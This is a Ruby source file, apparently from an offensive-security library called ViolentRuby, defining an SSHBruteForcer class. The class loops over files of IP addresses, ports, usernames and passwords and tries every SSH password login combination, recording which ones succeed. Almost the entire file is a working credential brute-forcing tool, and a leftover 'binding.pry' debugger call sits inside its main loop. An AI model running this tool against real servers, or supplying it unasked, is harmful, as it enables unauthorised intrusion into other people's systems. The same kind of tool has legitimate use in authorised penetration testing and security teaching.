require 'net/ssh'
require 'socketry'
require 'timeout'

module ViolentRuby
  # The SSH Brute Forcer class provides a simply way to 
  # brute-force an SSH server's credentials. 
  # @author Kent 'picat' Gruber
  #
  # @example Basic Usage
  #   ssh = SSHBruteForcer.new
  #   ssh.users     = "resources/ssh_users.txt"
  #   ssh.passwords = "resources/ssh_passwords.txt"
  #   ssh.ips       = "resources/ssh_ips.txt"
  #   ssh.ports     = "resources/ssh_ports.txt"
  #   # brue'm!
  #   ssh.brute_force!
  #   # => results
  #
  class SSHBruteForcer 
    # @attr [String] users Path to file containing users.
    attr_accessor :users
    # @attr [String] passwords Path to file containing passwords.
    attr_accessor :passwords
    # @attr [String] ips Path to file containing ip addresses.
    attr_accessor :ips
    # @attr [String] ports Path to file containing ports.
    attr_accessor :ports

    # Create a new SSH Brute Forcer.
    #
    # @param [Hash] args The options to create a new SSH Brute Forcer.
    # @param args [String] :users The path to a file of users to attempt.
    # @param args [String] :passwords The path to a file of passwords to attempt.
    # @param args [String] :ips The path to a file of server ips to attempt to connect to.
    # @param args [String] :ports The path to a file of service ports to attempt to connect to.
    def initialize(args = {})
      @users     = args[:users]     if args[:users]     && File.readable?(args[:users]) 
      @passwords = args[:passwords] if args[:passwords] && File.readable?(args[:passwords])
      @ips       = args[:ips]       if args[:ips]       && File.readable?(args[:ips])
      @ports     = args[:ports]     if args[:ports]     && File.readable?(args[:ports])
    end

    # Brute force some'a dem SSH login credz.
    #
    # @param [Hash] args The options to brute force. 
    # @param args [String] :users The path to a file of users to attempt.
    # @param args [String] :passwords The path to a file of passwords to attempt.
    # @param args [String] :ips The path to a file of server ips to attempt to connect to.
    # @param args [String] :ports The path to a file of service ports to attempt to connect to.
    # @return [Array<Hash>]
    def brute_force(args = {})
      meets_our_requirements?(args) 
      results   = []
      ips       = args[:ips]        || @ips 
      ports     = args[:ports]      || @ports
      users     = args[:users]      || @users
      passwords = args[:passwords]  || @passwords
      iterate_over(ips).each do |ip|
        iterate_over(ports).each do |port|
          binding.pry
          next unless connectable?(ip: ip, port: port)
          iterate_over(users).each do |user|
            iterate_over(passwords).each do |password|
              if able_to_login?(ip: ip, port: port, username: user, password: password)
                result = format_result("SUCCESS", ip, port, user, password)
              else
                result = format_result("FAILURE", ip, port, user, password)
              end
              results << result
              yield result if block_given?
            end
          end
        end
      end
      results
    end

    # brute_force! is the same as brute_force
    alias brute_force! brute_force

    # Check if a given IP address and port can connceted to.
    # @see #brute_force
    # @param [Hash] args the options to brute force. 
    # @param args [String] :ip The ip address to attempt to connect to.
    # @param args [String] :port The port to attempt to connect to.
    # @return [Boolean]
    def connectable?(args = {})
      Timeout::timeout(2) do
        Socketry::TCP::Socket.connect(args[:ip], args[:port])
        return true
      end
    rescue
      false
    end

    # Check if a given IP address, port, username and passwords 
    # are correct to login.
    # @see #brute_force
    # @param [Hash] args 
    # @param args [String] :ip 
    # @param args [String] :port 
    # @param args [String] :username
    # @param args [String] :password
    # @return [Boolean]
    def able_to_login?(args = {})
      Net::SSH.start(args[:ip], 
                     args[:username],
                     port: args[:port].to_i,
                     password: args[:password],
                     auth_methods: ['password'],
                     number_of_password_prompts: 0)
      true
    rescue
      false
    end

    private

    # @api private
    # Format the results from brute force attempts.
    # @see #brute_force
    # @param [String] type 
    # @param [String] ip
    # @param [Integer] port
    # @param [String] user 
    # @param [String] password 
    # @return [Hash]
    def format_result(type, ip, port, user, password)
      { time: Time.now, type: type, ip: ip, port: port, user: user, password: password }
    end

    # @api private
    # Iterate over each line in a file, stripping each line as it goes.
    # @see File
    # @param [String] file 
    # @return [Enumerator]
    def iterate_over(file)
      File.foreach(file).map(&:strip)
    end

    # @api private
    # Check if the given arguments contain an ip, port, password and user files.
    # @see #brute_force
    # @param [Hash] args the options to brute force. 
    # @param args [String] :ips
    # @param args [String] :ports
    # @param args [String] :passwords
    # @param args [String] :users
    # @return [Boolean]
    def meets_our_requirements?(args = {})
      raise "No ip addresses to connect to." unless ips?(args)
      raise "No ports to connect to."        unless ports?(args)
      raise "No passwords to try."           unless passwords?(args)
      raise "No users to try."               unless users?(args)
      true
    end

    # @api private
    # Check if the given arguments contains ips, or has been set.
    # @see #meets_our_requirements?
    # @param [Hash] args the options to brute force. 
    # @param args [String] :ips
    # @return [Boolean]
    def ips?(args = {})
      return true if args[:ips] || @ips
      false 
    end

    # @api private
    # Check if the given arguments contains passwords, or has been set.
    # @see #meets_our_requirements?
    # @param [Hash] args 
    # @param args [String] :passwords
    # @return [Boolean]
    def passwords?(args = {})
      return true if args[:passwords] || @passwords
      false
    end

    # @api private
    # Check if the given arguments contains ports, or has been set.
    # @see #meets_our_requirements?
    # @param [Hash] args 
    # @param args [String] :ports
    # @return [Boolean]
    def ports?(args = {})
      return true if args[:ports] || @ports
      false
    end

    # @api private
    # Check if the given arguments contains users, or has been set.
    # @see #meets_our_requirements?
    # @param [Hash] args 
    # @param args [String] :users
    # @return [Boolean]
    def users?(args = {})
      return true if args[:users] || @users
      false
    end



  end
end
